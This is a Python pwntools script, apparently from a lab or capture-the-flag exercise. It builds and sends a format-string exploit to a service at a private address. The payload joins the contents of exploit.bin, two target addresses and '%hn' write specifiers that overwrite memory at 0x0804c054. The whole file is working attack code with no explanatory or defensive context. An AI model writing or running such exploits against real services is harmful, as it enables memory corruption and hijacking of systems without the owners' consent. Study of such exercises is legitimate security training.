#!/usr/bin/env python3

from pwn import *

# Define target IP and port
target_host = '192.168.64.6'
target_port = 200

# Read the content of exploit.bin
#with open("exploit.bin", "rb") as f:
#    exploit_content = f.read()
#exploit_content = cat "exploit.bin"
exploit_content = subprocess.check_output(["cat", "exploit.bin"])
# Define the address you want to write
address_to_write = 0x0804c054
address_plus_two = 0x0804c056

# Construct the payload
payload = (
    exploit_content +  # Starting with the content of exploit.bin
    p32(address_to_write) + p32(address_plus_two) +  # Address to read in little-endian format
    b"%53912x%38$hn" + b"%11488x%39$hn"  # Format specifiers adjusted based on your exploit command
)

# Add a newline to the end of the payload
exploit_code = payload + b"\n"

# Connect to the target using the pwn remote function
io = remote(target_host, target_port)

# Send the exploit code
io.send(exploit_code)

# Receive and print the response (uncomment if needed)
#response = io.recvall()
#print(response.decode())

# Close the connection
io.close()

